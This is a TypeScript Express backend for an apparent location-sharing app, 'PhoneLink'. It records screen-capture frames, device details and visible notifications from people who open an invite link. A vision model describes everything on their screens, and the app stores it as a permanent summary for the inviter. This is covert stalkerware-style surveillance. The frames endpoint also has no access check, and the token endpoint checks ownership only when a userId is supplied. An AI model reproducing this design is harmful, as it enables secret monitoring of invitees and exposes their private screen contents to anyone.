import { Router } from "express";
import { z } from "zod";
import OpenAI from "openai";
import { db } from "@workspace/db";
import { consentSessionsTable } from "@workspace/db/schema";
import { eq, desc } from "drizzle-orm";
import { invitesTable } from "@workspace/db/schema";

const router = Router();

// ── Mistral Pixtral client (vision-capable) ───────────────────────────────────
const mistralKey = process.env.MISTRAL_API_KEY?.trim();
const pixtralClient = mistralKey
  ? new OpenAI({ apiKey: mistralKey, baseURL: "https://api.mistral.ai/v1" })
  : null;

const PIXTRAL_MODEL = "pixtral-12b-2409";

// ── Schema ────────────────────────────────────────────────────────────────────
const TimelineEvent = z.object({
  event:  z.string(),
  ts:     z.number(), // ms since page open
  detail: z.unknown().optional(),
});

const SaveSessionBody = z.object({
  token:          z.string(),
  timeline:       z.array(TimelineEvent).default([]),
  screenFrames:   z.array(z.string()).default([]),   // base64 JPEG data URLs
  deviceSnapshot: z.record(z.unknown()).optional(),
  notifications:  z.array(z.record(z.unknown())).optional(),
  timeToGrantMs:  z.number().optional(),
});

// ── Mistral Pixtral analysis ──────────────────────────────────────────────────
async function analyzeWithPixtral(
  timeline: z.infer<typeof TimelineEvent>[],
  frames: string[],
  deviceSnapshot: Record<string, unknown> | undefined,
  notifications: Record<string, unknown>[] | undefined,
): Promise<{ analysis: string; summary: string }> {
  if (!pixtralClient || frames.length === 0) {
    const textSummary = await textOnlySummary(timeline, deviceSnapshot, notifications);
    return { analysis: "", summary: textSummary };
  }

  // Build multi-modal message: all captured frames + timeline context
  const imageContent: OpenAI.ChatCompletionContentPart[] = frames.slice(0, 10).map((f, i) => ({
    type: "image_url" as const,
    image_url: {
      url: f.startsWith("data:") ? f : `data:image/jpeg;base64,${f}`,
      detail: "high" as const,
    },
  }));

  const timelineText = timeline
    .map((e) => `+${(e.ts / 1000).toFixed(1)}s — ${e.event}${e.detail ? ` (${JSON.stringify(e.detail)})` : ""}`)
    .join("\n");

  const deviceText = deviceSnapshot
    ? `Device: ${(deviceSnapshot as any).userAgent ?? "unknown"} | Battery: ${(deviceSnapshot as any).battery ?? "?"}% | Connection: ${(deviceSnapshot as any).connectionType ?? "?"}/${(deviceSnapshot as any).connectionEffective ?? "?"}`
    : "";

  const notifText = notifications?.length
    ? `Notifications visible at grant time:\n${notifications.map((n) => `• ${JSON.stringify(n)}`).join("\n")}`
    : "No push notifications were visible at grant time.";

  const analysisPrompt = `You are analyzing a contact's session with PhoneLink, a location-sharing app. The contact opened an invite link and the following screen captures were taken during their session until they shared their location.

TIMELINE OF EVENTS:
${timelineText}

${deviceText}

${notifText}

For each screen frame (in order), describe in detail:
1. What is visible on screen (apps, content, UI elements, text)
2. Any notifications or overlays present
3. What the person appears to be doing
4. Anything notable or unusual

Be thorough and precise — this analysis is permanently stored for the person who sent the invite.`;

  const summaryPrompt = `Based on the timeline and screen captures below, write a comprehensive permanent memory summary of this session. Include:
- Exact time from link open to location grant
- What was on their screen when they opened the link
- Everything they did during the session
- All notifications that appeared
- Device and connection details
- Any notable behavior or observations

Be factual, detailed, and organized. This will be queried later to recall specific details.

TIMELINE:
${timelineText}

${deviceText}
${notifText}`;

  try {
    // Frame-by-frame visual analysis
    const analysisResp = await pixtralClient.chat.completions.create({
      model: PIXTRAL_MODEL,
      max_tokens: 3000,
      messages: [
        {
          role: "user",
          content: [
            ...imageContent,
            { type: "text" as const, text: analysisPrompt },
          ],
        },
      ],
    });
    const analysis = analysisResp.choices[0]?.message?.content ?? "";

    // Comprehensive text summary combining everything
    const summaryResp = await pixtralClient.chat.completions.create({
      model: "mistral-large-latest",
      max_tokens: 2000,
      messages: [
        { role: "user", content: summaryPrompt + (analysis ? `\n\nVISUAL ANALYSIS:\n${analysis}` : "") },
      ],
    });
    const summary = summaryResp.choices[0]?.message?.content ?? "";

    return { analysis, summary };
  } catch (err) {
    console.error("[consent-sessions] Pixtral error:", err);
    // Fallback: text-only summary
    const summary = await textOnlySummary(timeline, deviceSnapshot, notifications);
    return { analysis: "", summary };
  }
}

async function textOnlySummary(
  timeline: z.infer<typeof TimelineEvent>[],
  deviceSnapshot: Record<string, unknown> | undefined,
  notifications: Record<string, unknown>[] | undefined,
): Promise<string> {
  if (!pixtralClient) return JSON.stringify({ timeline, deviceSnapshot, notifications });

  const timelineText = timeline
    .map((e) => `+${(e.ts / 1000).toFixed(1)}s — ${e.event}${e.detail ? ` (${JSON.stringify(e.detail)})` : ""}`)
    .join("\n");

  try {
    const resp = await pixtralClient.chat.completions.create({
      model: "mistral-large-latest",
      max_tokens: 1500,
      messages: [{
        role: "user",
        content: `Write a comprehensive session summary for a PhoneLink invite session. Include all details.\n\nTIMELINE:\n${timelineText}\n\nDEVICE: ${JSON.stringify(deviceSnapshot)}\n\nNOTIFICATIONS: ${JSON.stringify(notifications)}`,
      }],
    });
    return resp.choices[0]?.message?.content ?? "";
  } catch { return `Timeline: ${timelineText}`; }
}

// ── Routes ────────────────────────────────────────────────────────────────────

/** POST /api/consent-sessions — save session data + trigger Pixtral analysis */
router.post("/consent-sessions", async (req, res) => {
  const parsed = SaveSessionBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: parsed.error.issues }); return; }

  const { token, timeline, screenFrames, deviceSnapshot, notifications, timeToGrantMs } = parsed.data;

  try {
    // Upsert: if a session for this token already exists and is open, update it;
    // otherwise insert a new row.
    const existing = await db
      .select({ id: consentSessionsTable.id })
      .from(consentSessionsTable)
      .where(eq(consentSessionsTable.inviteToken, token))
      .orderBy(desc(consentSessionsTable.startedAt))
      .limit(1);

    const isGranted = timeToGrantMs != null;
    const grantedAt = isGranted ? new Date() : undefined;

    let sessionId: number;
    if (existing.length > 0) {
      sessionId = existing[0].id;
      await db.update(consentSessionsTable).set({
        timeline: timeline as any,
        screenFrames: screenFrames as any,
        deviceSnapshot: deviceSnapshot as any,
        notifications: notifications as any,
        ...(isGranted ? { grantedAt, timeToGrantMs, status: "granted" } : {}),
      }).where(eq(consentSessionsTable.id, sessionId));
    } else {
      const [row] = await db.insert(consentSessionsTable).values({
        inviteToken: token,
        timeline: timeline as any,
        screenFrames: screenFrames as any,
        deviceSnapshot: deviceSnapshot as any,
        notifications: notifications as any,
        ...(isGranted ? { grantedAt, timeToGrantMs, status: "granted" } : { status: "open" }),
      }).returning({ id: consentSessionsTable.id });
      sessionId = row.id;
    }

    res.status(202).json({ id: sessionId, message: "Session saved. Analysis running." });

    // Run Pixtral analysis in the background (non-blocking)
    setImmediate(async () => {
      try {
        const { analysis, summary } = await analyzeWithPixtral(
          timeline, screenFrames, deviceSnapshot, notifications,
        );
        await db.update(consentSessionsTable).set({ aiAnalysis: analysis, aiSummary: summary })
          .where(eq(consentSessionsTable.id, sessionId));
        console.log(`[consent-sessions] Analysis complete for session ${sessionId} (token ${token})`);
      } catch (err) {
        console.error("[consent-sessions] Background analysis failed:", err);
      }
    });
  } catch (err) {
    console.error("[consent-sessions] Save error:", err);
    res.status(500).json({ error: "Failed to save session" });
  }
});

/** GET /api/consent-sessions/:token — owner retrieves all sessions for their invite */
router.get("/consent-sessions/:token", async (req, res) => {
  const { token } = req.params;
  const userId = req.query.userId ? Number(req.query.userId) : null;

  // Verify the requesting user owns this invite
  if (userId) {
    const invite = await db
      .select({ fromUserId: invitesTable.fromUserId })
      .from(invitesTable)
      .where(eq(invitesTable.token, token))
      .limit(1);
    if (!invite.length || invite[0].fromUserId !== userId) {
      res.status(403).json({ error: "Forbidden" }); return;
    }
  }

  const sessions = await db
    .select({
      id:            consentSessionsTable.id,
      inviteToken:   consentSessionsTable.inviteToken,
      timeline:      consentSessionsTable.timeline,
      aiAnalysis:    consentSessionsTable.aiAnalysis,
      aiSummary:     consentSessionsTable.aiSummary,
      deviceSnapshot: consentSessionsTable.deviceSnapshot,
      notifications: consentSessionsTable.notifications,
      startedAt:     consentSessionsTable.startedAt,
      grantedAt:     consentSessionsTable.grantedAt,
      timeToGrantMs: consentSessionsTable.timeToGrantMs,
      status:        consentSessionsTable.status,
      frameCount:    consentSessionsTable.screenFrames, // intentionally not returning raw frames (too large)
    })
    .from(consentSessionsTable)
    .where(eq(consentSessionsTable.inviteToken, token))
    .orderBy(desc(consentSessionsTable.startedAt));

  // Return frameCount as a number instead of the raw array
  const result = sessions.map((s) => ({
    ...s,
    frameCount: Array.isArray(s.frameCount) ? (s.frameCount as string[]).length : 0,
  }));

  res.json(result);
});

/** GET /api/consent-sessions/:token/frames/:id — owner retrieves raw frames for one session */
router.get("/consent-sessions/session/:id/frames", async (req, res) => {
  const id = Number(req.params.id);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }

  const [session] = await db
    .select({ screenFrames: consentSessionsTable.screenFrames, inviteToken: consentSessionsTable.inviteToken })
    .from(consentSessionsTable)
    .where(eq(consentSessionsTable.id, id))
    .limit(1);

  if (!session) { res.status(404).json({ error: "Not found" }); return; }
  res.json({ frames: session.screenFrames, token: session.inviteToken });
});

export default router;
